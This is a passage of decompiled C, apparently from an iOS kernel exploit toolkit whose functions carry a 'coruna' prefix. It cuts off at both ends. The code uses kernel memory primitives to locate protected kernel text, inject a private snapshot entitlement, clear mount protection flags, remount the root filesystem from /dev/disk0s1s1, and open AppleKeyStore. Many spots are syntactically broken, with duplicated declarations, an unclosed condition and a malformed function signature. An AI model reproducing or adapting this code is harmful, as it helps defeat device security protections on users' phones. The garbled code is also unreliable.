    err = action < u;
    action = action - u;
    if (err || action == 0) {
      return;
    }
    serial_buf = serial_buf + u;
  }
  bootargs = serial_buf;
  scratch = host_info;
  thread_attr = action;
  handle = coruna_strsep(&scratch,ptr,0,1);
  if (handle == 0) {
    return;
  }
  addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
  if (addr == 0) {
    addr = 0;
  }
  else {
    addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    err = 0;
  }
  else {
    handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
    if (handle == 0) {
      return;
    }
    handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
    if (handle == 0) {
      return;
    }
    err = (int)handle - (int)addr;
  }
  if (addr == 0) {
    return;
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    if (*(int *)(handle + 0x140) < 0x1809) {
      err = 0x90000;
    }
    else {
      err = 0x88000;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
      }
    }
  }
  *(long *)(&k_kernel_slot_1888 + handle) = addr;
  *(int *)(&k_kernel_slot_1890 + handle) = err;
fail:
  *addr_2 = addr;
  *flags = err;
  return;
}





uint64_t coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_17fcc(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  unsigned long bootargs;
  long thread_attr [2];
  char host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long serial_buf;
  
  serial_buf = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  version = coruna_call_mach_vm_machine_attribute_29df8_17fcc(val,size_3,&scratch);
  u = bootargs;
  if ((int)version == 0) {
    return version;
  }
  if (bootargs == '\x03') {
    version = coruna_call_mach_vm_machine_attribute_29df8_17fcc(val,id_2,thread_attr);
    size = serial_buf;
    handle = thread_attr[0];
    if ((int)version == 0) {
      return version;
    }
    if (host_info == '\x03') {
      u = serial_buf & 0x3fff | (u >> 0xe & 0x3ffffffff) << 0xe;
      port = serial_buf & 0xffff000000000000 | u;
      if (((int)u != (int)serial_buf) &&
         (version = coruna_kernel600c_via_ctx_test_flag_5(val,thread_attr[0],port), (int)version == 0)) {
        return version;
      }
      if ((size >> 0x20 != port >> 0x20) &&
         (version = coruna_kernel600c_via_ctx_test_flag_5(val,handle + 4,port >> 0x20), (int)version == 0)) {
        return version;
      }
      coruna_semaphore_timedwait(val,&k_kernel_slot_2710);
      return 1;
    }
  }
  return 0;
}





void coruna_kernel600c_via_find_ppltext(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint scratch;
  unsigned long bootargs;
  uint32_t thread_attr;
  
  thread_attr = (uint32_t)val;
  bootargs = 0;
  scratch = 0;
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (err != 0) {
    if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
fail:
      coruna_kernel600c_via_ctx_test_flag_5(handle,arg,val);
      return;
    }
    err = coruna_find_ppltext(handle,&bootargs,&scratch);
    if (err != 0) {
      coruna_kernel600c_via_ctx_test_flag_5(handle,arg,val);
      return;
    }
  }
  return;
}





unsigned long coruna_kernel600c_via_ctx_test_flag_5(long arg,uint64_t val,uint64_t n)

{
  int fd_11;
  unsigned long type_id_17;
  
  fd_11 = coruna_ctx_test_flag(arg,0x5184000);
  if (((fd_11 == 0) ||
      ((*(unsigned long *)(arg + 0x158) < 0x2712000c700000 &&
       ((*(unsigned long *)(arg + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(arg + 0x140)))))))
     && ((fd_11 = coruna_ctx_test_flag(arg,0x5100000), fd_11 == 0 ||
         ((*(unsigned long *)(arg + 0x158) < 0x27120007400000 &&
          ((*(unsigned long *)(arg + 0x158) < 0x225c1e80500000 || (0x2711 < *(int *)(arg + 0x140))))
          ))))) {
    fd_11 = coruna_ctx_test_flag(arg,0x5184001);
    if ((fd_11 == 0) || (*(unsigned long *)(arg + 0x158) < 0x1f530000000000)) {
      type_id_17 = coruna_return_zero_1f898(arg,val,n);
    }
    else {
      fd_11 = coruna_kernel600c_via_ctx_test_flag_6(arg,val,n);
      type_id_17 = (unsigned long)(fd_11 == 0);
    }
  }
  else {
    type_id_17 = 0;
  }
  return type_id_17;
}





void coruna_vm_deallocate(long handle)
{
  uint8_t *ptr;
  long handle;
  long addr;
  
  coruna_mach_timebase_info_7e88();
  ptr = k_kernel_mach_task_self_slot;
  handle = 0;
  do {
    addr = *(long *)(handle + 0x470 + handle);
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(addr + 0x18),0x4000);
    *(uint64_t *)(addr + 0x18) = 0;
    handle = handle + -8;
  } while (handle != -0x10);
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x438),*(vm_size_t *)(handle + 0x448),
           *(vm_address_t *)(handle + 0x440));
  handle = 0;
  do {
    addr = *(long *)(handle + 0x498 + handle);
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(addr + 0x18),0x4000);
    *(uint64_t *)(addr + 0x18) = 0;
    handle = handle + -8;
  } while (handle != -0x10);
  *(uint32_t *)(handle + 0x510) = 1;
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(*(long *)(handle + 0x4d8) + 0xd0),0xc000,
           0xffffffffffffffff);
  return;
}





uint64_t coruna_kernel600c_via_return_zero_2d754(long handle,unsigned long arg)
{
  long handle;
  uint64_t u;
  
  handle = coruna_return_zero_2d754(handle,arg,0,arg);
  if ((handle == 0) &&
     (((handle = *(long *)(&k_kernel_slot_19f8 + handle), handle == 0 ||
       (arg < *(unsigned long *)(handle + 0xe0))) ||
      (*(long *)(handle + 0xe8) + *(unsigned long *)(handle + 0xe0) <= arg)))) {
    u = 0;
  }
  else {
    u = 1;
  }
  return u;
}





unsigned long coruna_return_zero_1071c(long arg,unsigned long val,long n,unsigned long m,unsigned long p,
                  uint64_t q)

{
  int fd_11;
  unsigned long type_id_17;
  uint64_t cache_77[2];
  byte cache_78;
  uint cache_55;
  
  if (val == 0) {
    return 0;
  }
  if (n == 0) {
    return 0;
  }
  if ((int)m == 0) {
    return 0;
  }
  type_id_17 = val & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff);
  if (type_id_17 == ((val + (m & 0xffffffff)) - 1 &
               (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff))) {
    if ((p & 1) != 0) {
      type_id_17 = coruna_bzero_3(arg,val,n,m,q);
      return type_id_17;
    }
    type_id_17 = coruna_call_mach_vm_machine_attribute_29df8_17fcc(arg,type_id_17,cache_77);
    if ((int)type_id_17 == 0) {
      return type_id_17;
    }
    if ((cache_78 | 2) == 3) {
      if ((cache_55 >> 7 & 1) != 0) {
        type_id_17 = coruna_kernel600c_via_find_ppltext(arg,cache_77[0],cache_55 & 0xffffff7f);
        if ((int)type_id_17 == 0) {
          return type_id_17;
        }
        coruna_semaphore_timedwait(arg,&k_kernel_slot_2710);
      }
      fd_11 = coruna_memcpy_108c4(arg,val,n,m,q);
      return (unsigned long)(fd_11 != 0);
    }
  }
  return 0;
}





uint64_t coruna_kernel600c_via_return_zero_1071c(long handle,uint64_t val,long addr_2)
{
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = addr_2;
  u = coruna_ctx_test_flag(handle,0x5184001);
  if (((int)u != 0) && (u = coruna_kernel600c_residual_228(handle,val,&scratch), (int)u != 0)) {
    if (scratch != addr_2) {
      u = coruna_kernel600c_via_return_zero_2d754(handle,val);
      u = coruna_return_zero_1071c(handle,val,&bootargs,*(uint32_t *)(handle + 0x168),u,1);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  return u;
}





uint64_t coruna_memcpy_108c4(long handle,uint64_t val,uint64_t id_2,int flags,int count_2)
{
  int err;
  uint64_t u;
  uint64_t scratch;
  
  if ((count_2 == 0) || (*(int *)(handle + 0x168) != flags)) {
    u = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,val);
    err = (int)u;
  }
  else {
    scratch = 0;
    ___memcpy_chk(&scratch,id_2,flags,8);
    u = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,val,scratch);
    err = (int)u;
  }
  if (err != 0) {
    u = 1;
  }
  return u;
}





void coruna_statfs(uint64_t val,uint *size)
{
  char *ptr;
  int err;
  int *err;
  uint64_t u;
  uint size;
  char scratch [10];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char bootargs;
  char host_info [16];
  statfs thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&thread_attr,0x878);
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch[0] = s__private_var_MobileSoftwareUpdat_000366e4[8];
  scratch[1] = s__private_var_MobileSoftwareUpdat_000366e4[9];
  scratch[2] = s__private_var_MobileSoftwareUpdat_000366e4[10];
  scratch[3] = s__private_var_MobileSoftwareUpdat_000366e4[0xb];
  scratch[4] = s__private_var_MobileSoftwareUpdat_000366e4[0xc];
  scratch[5] = s__private_var_MobileSoftwareUpdat_000366e4[0xd];
  scratch[6] = s__private_var_MobileSoftwareUpdat_000366e4[0xe];
  scratch[7] = s__private_var_MobileSoftwareUpdat_000366e4[0xf];
  scratch[2] = s__private_var_MobileSoftwareUpdat_000366e4[0];
  scratch[3] = s__private_var_MobileSoftwareUpdat_000366e4[1];
  scratch[4] = s__private_var_MobileSoftwareUpdat_000366e4[2];
  scratch[5] = s__private_var_MobileSoftwareUpdat_000366e4[3];
  scratch[6] = s__private_var_MobileSoftwareUpdat_000366e4[4];
  scratch[7] = s__private_var_MobileSoftwareUpdat_000366e4[5];
  scratch[8] = s__private_var_MobileSoftwareUpdat_000366e4[6];
  scratch[9] = s__private_var_MobileSoftwareUpdat_000366e4[7];
  thread_attr[0] = s__private_var_MobileSoftwareUpdat_000366e4[0x18];
  thread_attr[1] = s__private_var_MobileSoftwareUpdat_000366e4[0x19];
  thread_attr[2] = s__private_var_MobileSoftwareUpdat_000366e4[0x1a];
  thread_attr[3] = s__private_var_MobileSoftwareUpdat_000366e4[0x1b];
  thread_attr[4] = s__private_var_MobileSoftwareUpdat_000366e4[0x1c];
  thread_attr[5] = s__private_var_MobileSoftwareUpdat_000366e4[0x1d];
  thread_attr[6] = s__private_var_MobileSoftwareUpdat_000366e4[0x1e];
  bootargs[0] = s__private_var_MobileSoftwareUpdat_000366e4[0x10];
  bootargs[1] = s__private_var_MobileSoftwareUpdat_000366e4[0x11];
  bootargs[2] = s__private_var_MobileSoftwareUpdat_000366e4[0x12];
  bootargs[3] = s__private_var_MobileSoftwareUpdat_000366e4[0x13];
  bootargs[4] = s__private_var_MobileSoftwareUpdat_000366e4[0x14];
  bootargs[5] = s__private_var_MobileSoftwareUpdat_000366e4[0x15];
  bootargs[6] = s__private_var_MobileSoftwareUpdat_000366e4[0x16];
  bootargs[7] = s__private_var_MobileSoftwareUpdat_000366e4[0x17];
  bootargs = s__private_var_MobileSoftwareUpdat_000366e4[0x1f];
  host_info[0] = s__private_var_MobileSoftwareUpdat_000366e4[0x20];
  host_info[1] = s__private_var_MobileSoftwareUpdat_000366e4[0x21];
  host_info[2] = s__private_var_MobileSoftwareUpdat_000366e4[0x22];
  host_info[3] = s__private_var_MobileSoftwareUpdat_000366e4[0x23];
  host_info[4] = s__private_var_MobileSoftwareUpdat_000366e4[0x24];
  host_info[5] = s__private_var_MobileSoftwareUpdat_000366e4[0x25];
  host_info[6] = s__private_var_MobileSoftwareUpdat_000366e4[0x26];
  err = coruna_statfs_19324(0);
  ptr = scratch + 2;
  if (err == 0) {
    ptr = scratch;
  }
  err = _statfs(ptr,&thread_attr);
  if (err == 0) {
    if ((coruna_cat(thread_attr.f_mntfromname[7],thread_attr.f_mntfromname) != 0x7369642f7665642f
         || coruna_u64_pack71((thread_attr.f_mntfromname), (thread_attr.f_mntfromname[7])) != 0x31733173306b73
        size = 3;
        }
        *size = size;
        u = 1;
        done:
        if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
        return;
  }
  else {
    err = ___error();
    if (*err != 2) {
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
      return;
      }
      ___stack_chk_fail(u);
    }
fail:
    size = 3;
  }
  *size = size;
  u = 1;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





bool coruna_kernel600c_via_ptr_canonicalize_2(long handle,char *path)
{
  bool err;
  int err;
  int status;
  long handle;
  uint scratch;
  long bootargs;
  
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2) {
    handle = 0x260;
  }
  else if (err == 0x1809) {
    handle = 0x208;
  }
  else {
    if (err != 0x1c1b) {
      return false;
    }
    handle = 0x200;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      handle = 0x218;
    }
  }
  err = _open(path,0x100000);
  if (err < 0) {
    err = false;
  }
  else {
    bootargs = coruna_return_zero_10be4(handle,err);
    if ((((bootargs == 0) || (status = coruna_kernel600c_residual_228(handle,bootargs + handle,&bootargs), status == 0))
        || (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
       (((status = coruna_kernel600c_residual_228(handle,bootargs + 0xe0,&bootargs), status == 0 ||
         (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
        (status = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,bootargs + 0x30,4,&scratch), status == 0)))) {
      err = false;
    }
    else {
      scratch = scratch & 0xffffbfff;
      status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,bootargs + 0x30,&scratch,4);
      err = status != 0;
    }
    _close(err);
  }
  return err;
}





long coruna_return_zero_10be4(long handle)
{
  int err;
  long handle;
  long scratch;
  
  err = *(int *)(handle + 0x140);
  if ((err - 0x1f53U < 2 || err == 0x1c1b) || err == 0x1809) {
    scratch = coruna_fileport_makeport();
    if (scratch == 0) {
      return 0;
    }
    scratch = scratch + 0x8f8;
    err = coruna_kernel600c_residual_228(handle,scratch,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





void coruna_root_dev_disk(uint64_t val)
{
  bool err;
  int err;
  uint64_t u;
  uint size;
  char scratch [2];
  statfs bootargs;
  char thread_attr [8];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char host_info;
  char host_info [8];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch = (char  [8])0;
  thread_attr = (char  [8])0;
  thread_attr = (char  [7])0;
  bootargs = (char  [8])0;
  host_info = s__private_var_MobileSoftwareUpdat_000366e4[0x1f];
  host_info._0_7_ = 0;
  _bzero(&bootargs,0x878);
  err = _statfs(scratch,&bootargs);
  if (err == 0) {
    u = coruna_statfs_10d70(val,scratch,"/dev/disk0s1s1");
    if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_statfs_10d70(long handle,char *path,char *str_2)
{
  int err;
  int status;
  size_t ls3;
  long handle;
  uint64_t u;
  int scratch;
  statfs bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&bootargs,0x878);
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (((((1 < err - 0x1f53U && err != 0x1c1b) && err != 0x1809) ||
       (err = _statfs(path,&bootargs), err != 0)) ||
      (ls3 = _strlen(str_2), 0x3ff < ls3)) || (err = _open(path,0), err < 1)) {
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return u;
    }
    ___stack_chk_fail();
  }
  handle = coruna_fileport_makeport(handle,err);
  if (handle == 0) {
done:
    u = 0;
  }
  else {
    status = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x4e4,4,&scratch);
    if ((status == 0) || (scratch != bootargs.f_mntfromname)) goto done;
    u = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + 0x4e4,str_2,(int)ls3 + 1);
  }
  _close(err);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return u;
  }
  ___stack_chk_fail();
}





void coruna_statfs_10eb8(char *path)
{
  bool err;
  int err;
  statfs scratch;
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&scratch,0x878);
  err = _statfs(path,&scratch);
  if (err == 0) {
    if (coruna_cat(scratch.f_mntfromname[7],scratch.f_mntfromname) == 0x7369642f7665642f
        && coruna_u64_pack71((scratch.f_mntfromname), (scratch.f_mntfromname[7])) == 0x31733173306b73)
    {
      err = _strcmp(path,scratch.f_mntonname);
      err = err == 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(err);
    }
  }
  else {
    ___error();
  }
  err = false;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(err);
}





int * coruna_setup_apfs_root(long handle,int flags)
{
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  int status;
  int *err;
  unsigned long size;
  char *ptr;
  char *buf;
  uint64_t version;
  int *status;
  int flags;
  char scratch [3];
  char bootargs;
  statfs *thread_attr;
  char host_info [8];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char serial_buf;
  char host_info [8];
  char *action;
  char *block_ctx;
  char *stack_guard;
  char *sa_saved;
  char *sa_new;
  uint64_t scratch;
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs = '\0';
  scratch = (char  [8])0;
  host_info = (char  [8])0;
  thread_attr = (char  [7])0;
  bootargs = (char  [8])0;
  serial_buf = s__private_var_MobileSoftwareUpdat_000366e4[0x1f];
  host_info._0_7_ = 0;
  scratch[0] = '/';
  scratch[1] = '\0';
  coruna_ctx_set_flag(handle,0x400);
  ptr = k_kernel_mach_task_self_slot;
  err = (int *)coruna_kernel600c_via_return_zero_2b0c0(handle,*(uint32_t *)k_kernel_mach_task_self_slot,
                               "<dict><key>com.apple.private.vfs.snapshot</key><true/></dict>",0,8);
  if ((((int)err == 0) || (err = (int *)coruna_call_mac_syscall_35844(), (int)err == 0)) ||
     ((err = coruna_statfs_19324(scratch + 3), err != 0 &&
      ((bootargs == '\0' && (err = (int *)coruna_root_dev_disk(handle), (int)err == 0))))))
  status = (int *)0x0;
  if (*(long *)k_kernel_stack_chk_guard_slot != path_buf) {
  ___stack_chk_fail(err);
  }
  return status;
}





uint64_t coruna_root_dev_disk_11310(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0;
  u = coruna_return_zero_117f4(val,id_2,1,&scratch);
  if ((int)u != 0) {
    err = coruna_mount("/dev/disk0s1s1",id_2,0x110001);
    if (err == 0) {
      u = 1;
    }
    else {
      coruna_return_zero_117f4(val,id_2,scratch,0);
      u = 0;
    }
  }
  return u;
}





bool coruna_getmntinfo(long handle,uint size)
{
  bool err;
  uint u;
  int err;
  int status;
  long handle;
  uint64_t size;
  char *ptr;
  unsigned long version;
  unsigned long port;
  uint scratch;
  uint32_t bootargs;
  statfs *thread_attr;
  
  thread_attr = (statfs *)0x0;
  u = _getmntinfo(&thread_attr,0);
  if (u == 0) {
    version = 1;
  }
  else {
    port = (unsigned long)u;
    ptr = thread_attr->f_mntonname;
    version = 1;
    do {
      err = _strcmp("/",ptr);
      if (err == 0) {
        version = (unsigned long)((byte)*(uint32_t *)(ptr + -0x18) & 1);
      }
      ptr = ptr + 0x878;
      port = port - 1;
    } while (port != 0);
  }
  u = coruna_getmntinfo_119ec();
  bootargs = 0;
  if ((~(uint)version & 1) == size) {
    return true;
  }
  if (size == 0) {
    if ((u != 0) && (err = coruna_return_zero_117f4(handle,"/",1,&bootargs), err == 0)) {
      return false;
    }
    size = 0x10010001;
    err = -1;
  }
  else {
    err = _open("/",0);
    if (err == -1) {
      return false;
    }
    status = *(int *)(handle + 0x140);
    if (((1 < status - 0x1f53U) && (status != 0x1c1b)) && (status != 0x1809)) {
      return false;
    }
    handle = coruna_fileport_makeport(handle,err);
    if (handle == 0) {
      return false;
    }
    version = handle + 0x70;
    if (version == 0) {
      return false;
    }
    status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,version,&scratch);
    if (status == 0) {
      return false;
    }
    scratch = scratch & 0xffffbfff;
    status = coruna_mach_vm_machine_attribute(handle,version);
    if (status == 0) {
      return false;
    }
    status = _open("/",0);
    if (-1 < status) {
      thread_attr = (statfs *)((unsigned long)thread_attr & 0xffffffff00000000);
      _ffsctl(status,0x80046814,&thread_attr,0);
      thread_attr = 1;
      _ffsctl(status,0x80046815,&thread_attr,0);
      thread_attr = (statfs *)coruna_u64_pack((thread_attr), (2));
      if (u != 0) {
        _ffsctl(status,0x80044a11,&thread_attr,0);
        thread_attr = (statfs *)coruna_u64_pack((thread_attr), (3));
      }
      _ffsctl(status,0x80046816,&thread_attr,0);
      _close(status);
    }
    size = 0x10000;
  }
  if (u == 0) {
    status = coruna_mount_119b0("/dev/disk0s1s1","/",size);
  }
  else {
    status = coruna_mount();
  }
  err = status != -1;
  if (size == 0) {
    if (err || ((u ^ 1) & 1) != 0) {
      return err;
    }
    err = coruna_return_zero_117f4(handle,"/",bootargs,0);
    if (err != 0) {
      return err;
    }
  }
  else {
    status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,version,&scratch);
    if (status != 0) {
      scratch = scratch | 0x4000;
      status = coruna_mach_vm_machine_attribute(handle,version);
      if (status != 0) {
        _close(err);
        return err;
      }
    }
  }
  return false;
}





uint64_t coruna_kernel600c_str_if_ivar2_0_pcvar5(uint64_t val,void *ctx,uint *size,int *flags)
{
  int err;
  int status;
  size_t ls3;
  uint64_t u;
  char *ptr;
  unsigned long size;
  
  err = coruna_statfs_19324(0);
  if (err == 0) {
    ptr = "/";
fail:
    ls3 = _strlen(ptr);
    size = ls3 + 1;
    if (*size < size) {
      u = 0;
      if (flags != (int *)0x0) {
      *flags = err;
      }
      return u;
    }
    _memcpy(ctx,ptr,size);
  }
  else {
    status = coruna_statfs_10eb8("/private/var/MobileSoftwareUpdate/mnt1");
    if (status != 0) {
      ptr = "/private/var/MobileSoftwareUpdate/mnt1/";
      {
        ls3 = _strlen(ptr);
        size = ls3 + 1;
        if (*size < size) {
        u = 0;
        if (flags != (int *)0x0) {
        *flags = err;
        }
        return u;
        }
        _memcpy(ctx,ptr,size);
      }
    }
    size = 0;
  }
  *size = (uint)size;
  u = 1;
joined_r0x000116c0:
  if (flags != (int *)0x0) {
    *flags = err;
  }
  return u;
}





void coruna_fileport_makeport(void)
{
  _fileport_makeport();
  return;
}





uint64_t coruna_return_zero_117f4(long handle,char *path,uint64_t val,uint *size)
{
  int err;
  int status;
  long handle;
  long addr;
  uint64_t u;
  uint scratch;
  
  err = _open(path,0);
  if (err == -1) {
    return 0;
  }
  handle = coruna_return_zero_10be4(handle,err);
  if (handle != 0) {
    status = *(int *)(handle + 0x140);
    if (status - 0x1f53U < 2) {
      addr = 0x224;
    }
    else if (status == 0x1809) {
      addr = 0x1c8;
    }
    else {
      u = 0;
      _close(err);
      return u;
    }
    status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr + handle,&scratch);
    u = 0;
    _close(err);
    return u;
  }
fail:
  u = 0;
done:
  _close(err);
  return u;
}





void coruna_mount(uint64_t val,char *path,uint size)
{
  int err;
  uint64_t scratch;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t action;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t block_ctx;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t stack_guard;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t sa_saved;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t sa_new;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  cache_24 = 0;
  sa_new = 0;
  cache_26 = 0;
  cache_25 = 0;
  cache_21 = 0;
  sa_saved = 0;
  cache_23 = 0;
  cache_22 = 0;
  work = 0;
  stack_guard = 0;
  cache_20 = 0;
  cache = 0;
  url_buf = 0;
  block_ctx = 0;
  frame = 0;
  json_buf = 0;
  tmp_buf = 0;
  action = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  serial_buf = 0;
  path_buf = 0;
  sa_new = 0;
  action = 0;
  host_info = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  thread_attr = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  bootargs = 0;
  scratch = (unsigned long)size;
  path_buf = 0;
  scratch = val;
  err = _mount("apfs",path,size,&scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return;
  }
  ___stack_chk_fail(err);
}





int coruna_mount_119b0(uint64_t val,char *path,int flags)
{
  int err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  bootargs = 0;
  scratch = val;
  err = _mount("hfs",path,flags,&scratch);
  return err;
}





bool coruna_getmntinfo_119ec(void)
{
  bool err;
  uint u;
  int err;
  char *ptr;
  unsigned long size;
  statfs *scratch;
  
  scratch = (statfs *)0x0;
  u = _getmntinfo(&scratch,0);
  err = false;
  if (u != 0) {
    size = (unsigned long)u;
    ptr = scratch->f_mntonname;
    do {
      err = _strcmp("/",ptr);
      if (err == 0) {
        err = _strncmp("apfs",ptr + -0x10,0x10);
        err = err == 0;
      }
      ptr = ptr + 0x878;
      size = size - 1;
    } while (size != 0);
  }
  return err;
}





void coruna_cfpropertylistcreatewithdata(uint *size,unsigned long arg,char *path)
{
  uint u;
  uint8_t *ptr;
  int err;
  size_t ls4;
  void **lppv5;
  long handle;
  void *ptr;
  long addr;
  long off;
  char *ptr;
  uint64_t size;
  uint64_t scratch;
  long bootargs;
  uint *thread_attr;
  uint32_t host_info;
  long serial_buf;
  uint64_t action;
  uint32_t block_ctx;
  pthread_t stack_guard;
  uint8_t sa_saved[24];
  int sa_new [26];
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 100;
  bootargs = 0;
  if (0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) {
    coruna_cfdatagetbyteptr(size,arg,path,1);
    if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
    return;
    }
    ___stack_chk_fail();
  }
  err = coruna_mach_absolute_time_1a9c0(size,0,&k_kernel_slot_2710);
  if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
  return;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_kernel600c_via_return_zero_2b0c0(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            uint size)
{
  long handle;
  uint64_t u;
  uint scratch;
  
  scratch = 0;
  if ((size & 0xb) == 0) {
    u = 0;
  }
  else {
    handle = coruna_ret_stub_2();
    u = 0;
    if ((((handle != 0) && (handle = coruna_return_zero_2b0c0(val,handle), u = 0, handle != 0)) &&
        (u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,handle,4,&scratch), (int)u != 0)) &&
       (((scratch & size) == 0 &&
        (u = coruna_cfpropertylistcreatewithdata(val,id_2,size_3), (int)u != 0)))) {
      scratch = scratch | size;
      u = coruna_call_mach_vm_machine_attribute_29df8_1e994(val,handle,&scratch,4);
    }
  }
  return u;
}





void coruna_open_m2scaler(long *handle)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  uint64_t size;
  long off;
  uint32_t version;
  long *ptr;
  unsigned long scratch;
  long bootargs;
  uint64_t thread_attr;
  int host_info;
  
  off = *handle;
  ptr = (long *)handle[2];
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  err = coruna_kernel600c_via_kernel600c_via_return_zero_28118_2(off,(int)handle[1]);
  if ((err != 0) && (handle = coruna_ptr_canonicalize(off,*(uint64_t *)(off + 0x390)), handle != 0)) {
    if (*(int *)(off + 0x140) < 0x1c1b) {
      u = coruna_ioservicegetmatchingservice_1bb7c("AppleM2ScalerCSCDriver");
      handle = 0;
    }
    else {
      u = coruna_ioservicegetmatchingservice_1bb7c("AppleKeyStore");
      err = coruna_ctx_test_flag(off,4);
      if (err != 0) {
        handle = 0;
      }
      else {
        handle = *(long *)(off + 0x3a8);
      }
    }
